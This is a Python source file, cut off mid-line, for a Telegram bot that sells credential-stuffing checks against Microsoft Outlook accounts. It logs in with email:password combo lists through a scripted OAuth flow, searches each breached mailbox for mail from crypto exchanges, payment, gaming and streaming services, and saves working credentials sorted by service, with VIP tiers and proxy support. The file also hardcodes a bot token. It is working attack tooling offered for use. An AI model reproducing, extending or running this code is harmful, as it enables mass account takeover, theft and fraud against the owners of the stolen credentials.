import asyncio
import os
import re
import json
import uuid
import time
import urllib.parse
from datetime import datetime, date, timedelta
from pathlib import Path
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple, Optional
from queue import Queue
import io

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8763263971:AAGy-Ke8YdOVJvEz1JYXOAeBlwHuYXJ3CPY"  # Telegram bot token
ADMIN_IDS = [1720020794]                          # Admin user IDs
MAX_CONCURRENT_JOBS = 1000                           # Maximum concurrent jobs
THREADS_PER_JOB = 15                               # Threads per job
DASHBOARD_UPDATE_INTERVAL = 100                    # Dashboard update frequency
ACCOUNT_DELAY = 0.05                                # Delay between accounts
PROXY_LIST = []                                     # Proxy list ["http://user:pass@ip:port", ...]
PROXY_ROTATION = False                               # Proxy rotation
RESULT_BASE_DIR = "results"                          # Results directory
USER_DATA_FILE = "users.json"                        # User database file

# ================= FILE SIZE LIMITS (bytes) =================
FILE_SIZE_LIMITS = {
    0: 5 * 1024 * 1024,    # Normal: 5 MB
    1: 15 * 1024 * 1024,   # VIP: 15 MB
    2: 30 * 1024 * 1024,   # VIP+: 30 MB
}

# ================= DAILY FILE UPLOAD LIMITS =================
DAILY_FILE_LIMITS = {
    0: 3,    # Normal: 3 files per day
    1: 9999, # VIP: unlimited
    2: 9999, # VIP+: unlimited
}

# ================= SENDER EMAIL -> PLATFORM NAME MAPPING =================
SENDER_MAP = {
    # Games
    "noreply@accounts.riotgames.com": "Riot Games",
    "no-reply@nordaccount.com": "NordVPN",
    "noreply@id.supercell.com": "Supercell",
    "accounts@roblox.com": "Roblox",
    "no-reply@info.coinbase.com": "Coinbase",
    "noreply@pubgmobile.com": "PUBG Mobile",
    "noreply@accounts.spotify.com": "Spotify",
    "no-reply@paypal.com": "PayPal",
    "noreply@amazon.com": "Amazon",
    "no-reply@accounts.ea.com": "EA",
    "noreply@news.ubisoft.com": "Ubisoft",
    "noreply@epicgames.com": "Epic Games",
    "no-reply@discord.com": "Discord",
    "noreply@twitch.tv": "Twitch",
    "no-reply@steampowered.com": "Steam",
    "noreply@battle.net": "Battle.net",
    "noreply@rockstargames.com": "Rockstar",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Mojang",
    "noreply@xbox.com": "Xbox",
    "noreply@playstation.com": "PlayStation",
    "noreply@nintendo.com": "Nintendo",
    "no-reply@ea.com": "EA",
    "noreply@fortnite.com": "Fortnite",
    "noreply@pubg.com": "PUBG",
    "noreply@valorant.com": "Valorant",
    "noreply@leagueoflegends.com": "League of Legends",
    # Streaming
    "no-reply@netflix.com": "Netflix",
    "noreply@disneyplus.com": "Disney+",
    "no-reply@hulu.com": "Hulu",
    "noreply@hbomax.com": "HBO Max",
    "noreply@primevideo.com": "Amazon Prime",
    "no-reply@paramountplus.com": "Paramount+",
    "noreply@crunchyroll.com": "Crunchyroll",
    "noreply@plex.tv": "Plex",
    "no-reply@youtube.com": "YouTube",
    # Music
    "no-reply@spotify.com": "Spotify",
    "noreply@music.apple.com": "Apple Music",
    "noreply@tidal.com": "Tidal",
    "noreply@deezer.com": "Deezer",
    "noreply@soundcloud.com": "SoundCloud",
    # Crypto & Finance
    "no-reply@binance.com": "Binance",
    "noreply@coinbase.com": "Coinbase",
    "noreply@kraken.com": "Kraken",
    "noreply@kucoin.com": "KuCoin",
    "noreply@bybit.com": "Bybit",
    "noreply@crypto.com": "Crypto.com",
    "noreply@metamask.io": "MetaMask",
    "no-reply@ledger.com": "Ledger",
    "no-reply@blockchain.com": "Blockchain",
    # Storage / Office / Subscription
    "noreply@dropbox.com": "Dropbox",
    "noreply@googledrive.com": "Google Drive",
    "noreply@onedrive.com": "OneDrive",
    "noreply@microsoft.com": "Microsoft",
    "noreply@icloud.com": "iCloud",
    "noreply@mega.nz": "MEGA",
    "noreply@canva.com": "Canva",
    "noreply@adobe.com": "Adobe",
    "noreply@slack.com": "Slack",
    "noreply@zoom.us": "Zoom",
    # E-commerce & Other
    "noreply@ebay.com": "eBay",
    "noreply@nike.com": "Nike",
    "no-reply@nordvpn.com": "NordVPN",
    "noreply@expressvpn.com": "ExpressVPN",
    "noreply@facebook.com": "Facebook",
    "noreply@instagram.com": "Instagram",
    "noreply@twitter.com": "Twitter (X)",
    "noreply@linkedin.com": "LinkedIn",
    "noreply@tiktok.com": "TikTok",
    "noreply@reddit.com": "Reddit",
    "noreply@telegram.org": "Telegram",
    "noreply@uber.com": "Uber",
    "noreply@airbnb.com": "Airbnb",
    # Development & Education
    "noreply@github.com": "GitHub",
    "noreply@gitlab.com": "GitLab",
    "noreply@stackoverflow.com": "Stack Overflow",
    "noreply@medium.com": "Medium",
    "noreply@patreon.com": "Patreon",
    "noreply@udemy.com": "Udemy",
    "noreply@duolingo.com": "Duolingo",
    # Design
    "noreply@figma.com": "Figma",
    "noreply@accounts.google.com": "Google",
    "noreply@paypal.com": "PayPal",
    "noreply@apple.com": "Apple",
}

# All sender patterns for search query
SENDER_PATTERNS = list(SENDER_MAP.keys())

# ================= SESSION POOL =================
class SessionPool:
    """HTTP session pool for connection reuse"""
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = Queue()
        self._init_pool()
    
    def _init_pool(self):
        for _ in range(self.pool_size):
            session = requests.Session()
            # Connection pooling settings
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=2,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.put(session)
    
    def get_session(self):
        return self.sessions.get()
    
    def return_session(self, session):
        session.cookies.clear()
        self.sessions.put(session)

# Global session pool
session_pool = SessionPool(pool_size=THREADS_PER_JOB * 3)

# ================= TIME MANAGER =================
def get_today_istanbul():
    """Returns today's date in Istanbul timezone (UTC+3)"""
    utc_now = datetime.utcnow()
    istanbul_now = utc_now + timedelta(hours=3)
    return istanbul_now.date()

# ================= USER DATABASE =================
def load_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id: int) -> dict:
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()
    
    if user_id_str not in users:
        users[user_id_str] = {
            "vip_level": 0,
            "total_jobs": 0,
            "total_hits": 0,
            "daily_stats": {
                "date": today,
                "files_uploaded": 0
            }
        }
        save_users(users)
        print(f"👤 New user created: {user_id}")
    else:
        # Reset daily counter if day changed
        if users[user_id_str].get("daily_stats", {}).get("date") != today:
            users[user_id_str]["daily_stats"] = {
                "date": today,
                "files_uploaded": 0
            }
        
        # Check for missing fields
        if "vip_level" not in users[user_id_str]:
            users[user_id_str]["vip_level"] = 0
        if "total_jobs" not in users[user_id_str]:
            users[user_id_str]["total_jobs"] = 0
        if "total_hits" not in users[user_id_str]:
            users[user_id_str]["total_hits"] = 0
        
        save_users(users)
    
    return users[user_id_str]

def update_user(user_id: int, data: dict):
    users = load_users()
    users[str(user_id)].update(data)
    save_users(users)

def increment_daily_file_count(user_id: int):
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()
    
    if "daily_stats" not in users[user_id_str]:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    elif users[user_id_str]["daily_stats"].get("date") != today:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    
    users[user_id_str]["daily_stats"]["files_uploaded"] += 1
    save_users(users)

# ================= OUTLOOK SENDER-BASED CHECKER =================
class OutlookSenderChecker:
    # Pre-compiled regex patterns
    PPFT_PATTERN1 = re.compile(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"')
    PPFT_PATTERN2 = re.compile(r'name="PPFT".*?value="([^"]*)"')
    URLPOST_PATTERN1 = re.compile(r'urlPost":"(.*?)"')
    URLPOST_PATTERN2 = re.compile(r"urlPost:'(.*?)'")
    UAID_PATTERN1 = re.compile(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"')
    UAID_PATTERN2 = re.compile(r'name="uaid" id="uaid" value="(.*?)"')
    OPID_PATTERN = re.compile(r'opid%3d(.*?)%26')
    OPIDT_PATTERN = re.compile(r'opidt%3d(.*?)&')
    CODE_PATTERN = re.compile(r'code=(.*?)&')
    
    def __init__(self):
        self.session = session_pool.get_session()
        self.ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        self.client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        self.redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"

    def __del__(self):
        if hasattr(self, 'session'):
            session_pool.return_session(self.session)

    def get_regex(self, pattern, text):
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_ppft(self, html):
        match = self.PPFT_PATTERN1.search(html)
        if match: return match.group(1)
        match = self.PPFT_PATTERN2.search(html)
        if match: return match.group(1)
        return None

    def search_emails_by_sender(self, token, cid, email, password):
        url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        query_string = " OR ".join(f'"{pattern}"' for pattern in SENDER_PATTERNS)
        
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": query_string},
                "Size": 25,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": False
            }],
            "AnswerEntityRequests": [],
            "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False}
        }
        
        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Connection": "keep-alive"
        }

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except (KeyError, IndexError):
                    results = []
                
                if results:
                    platform_counts = {}
                    hit_details = []

                    for item in results:
                        source = item.get('Source', {})
                        subject = source.get('Subject') or "No Subject"
                        
                        sender_address = "Unknown"
                        if 'Sender' in source and 'EmailAddress' in source['Sender']:
                            sender_address = source['Sender']['EmailAddress'].get('Address', 'Unknown')
                        
                        platform = SENDER_MAP.get(sender_address, sender_address)
                        platform_counts[platform] = platform_counts.get(platform, 0) + 1
                        
                        hit_details.append({"sender": sender_address, "subject": subject})
                    
                    return {"status": "HIT", "platform_counts": platform_counts, "details": hit_details[:3]}
                else:
                    return {"status": "FREE", "platform_counts": {}, "details": []}
            else:
                return {"status": "ERROR_API"}
        except Exception:
            return {"status": "ERROR_API"}

    def check_account(self, email, password):
        self.session.cookies.clear()
        
        try:
            # --- STEP 1: AUTH INIT ---
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id={self.client_id}&mkt=en&response_type=code&redirect_uri={urllib.parse.quote(self.redirect_uri)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            headers = {"User-Agent": self.ua, "Connection": "keep-alive"}
            
            r1 = self.session.get(url_auth, headers=headers, allow_redirects=False, timeout=8)
            if r1.status_code != 302:
                return "ERROR_NET"

            next_url = r1.headers['Location']
            r2 = self.session.get(next_url, headers=headers, allow_redirects=False, timeout=8)
            
            ppft = self.extract_ppft(r2.text)
            url_post = self.get_regex(self.URLPOST_PATTERN1, r2.text) or self.get_regex(self.URLPOST_PATTERN2, r2.text)

            if not ppft:
                return "ERROR_PARAMS"

            # --- STEP 2: LOGIN ---
            data_login = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
                "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
            }
            headers_post = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": self.ua, "Connection": "keep-alive"}
            r3 = self.session.post(url_post, data=data_login, headers=headers_post, allow_redirects=False, timeout=8)

            if "incorrect" in r3.text.lower() or ("password" in r3.text.lower() and "error" in r3.text.lower()):
                return "BAD"

            # --- STEP 3: OAUTH REDIRECT ---
            if r3.status_code == 302 and "Location" in r3.headers:
                oauth_url = r3.headers['Location']
            else:
                uaid = self.get_regex(self.UAID_PATTERN1, r3.text) or self.get_regex(self.UAID_PATTERN2, r3.text)
                opid = self.get_regex(self.OPID_PATTERN, r3.text)
                opidt = self.get_regex(self.OPIDT_PATTERN, r3.text)
                
                if uaid and opid:
                    oauth_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id={self.client_id}&opid={opid}&mkt=EN-US&opidt={opidt}&res=success&route=C105_BAY"
                else:
                    return "BAD"

            # --- STEP 4: GET CODE ---
            code = None
            if oauth_url.startswith("msauth://"):
                code = self.get_regex(self.CODE_PATTERN, oauth_url)
            else:
                r4 = self.session.get(oauth_url, allow_redirects=False, timeout=8)
                code = self.get_regex(self.CODE_PATTERN, r4.headers.get('Location', ''))

            if not code:
                return "2FA"

            # --- STEP 5: GET TOKEN ---
            data_token = {
                "client_info": "1", "client_id": self.client_id, "redirect_uri": self.redirect_uri,
                "grant_type": "authorization_code", "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r5 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data_token, timeout=8)
            
            if r5.status_code == 200:
                token = r5.json().get('access_token')
                mspcid = self.session.cookies.get("MSPCID", "")
                cid = mspcid.upper() if mspcid else "0000000000000000"
                
                return self.search_emails_by_sender(token, cid, email, password)
            else:
                return "ERROR_TOKEN"

        except requests.exceptions.Timeout:
            return "ERROR_TIMEOUT"
        except Exception as e:
            return "ERROR_SYS"

# ================= RESULT MANAGER =================
class ResultManager:
    def __init__(self, combo_filename, base_dir="result"):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = os.path.join(base_dir, f"({timestamp})_{combo_filename}_multi_hits")
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.free_file = os.path.join(self.base_folder, "free.txt")  # NEW: Free accounts file
        self.services_folder = os.path.join(self.base_folder, "services")
        
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)
        
    def save_hit(self, email, password, result_data):
        platform_counts = result_data.get("platform_counts", {})
        services_str = " | ".join([f"{platform}: {count}" for platform, count in sorted(platform_counts.items())])
        
        # Save to hits file with platform info
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password} | {services_str}\n")
        
        # Save to platform-specific files
        for platform in platform_counts.keys():
            service_file = os.path.join(self.services_folder, f"{platform}_hits.txt")
            with open(service_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
    
    def save_free(self, email, password):
        """Save free account (no hits found)"""
        with open(self.free_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

# ================= JOB CLASS =================
class Job:
    def __init__(self, user_id, chat_id, combo_list, filename, priority=1):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combo_list = combo_list
        self.filename = filename
        self.total = len(combo_list)
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bads = 0
        self.twofa = 0
        self.errors = 0
        self.start_time = None
        self.status = "queued"
        self.last_hits = deque(maxlen=5)
        self.dashboard_msg_id = None
        self.lock = asyncio.Lock()
        self.cancel_event = asyncio.Event()
        self.result_manager = None
        self.priority = priority  # 0: VIP, 1: normal

    def __lt__(self, other):
        return self.priority < other.priority

# ================= DASHBOARD FORMATTER =================
def format_dashboard_html(job: Job, speed=0.0, eta="--"):
    completed = (job.checked / job.total * 100) if job.total else 0
    success_rate = (job.hits / job.checked * 100) if job.checked else 0

    last_hits_lines = []
    for email, platforms in job.last_hits:
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe_platforms = str(platforms).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        last_hits_lines.append(f"📧 {safe_email} | {safe
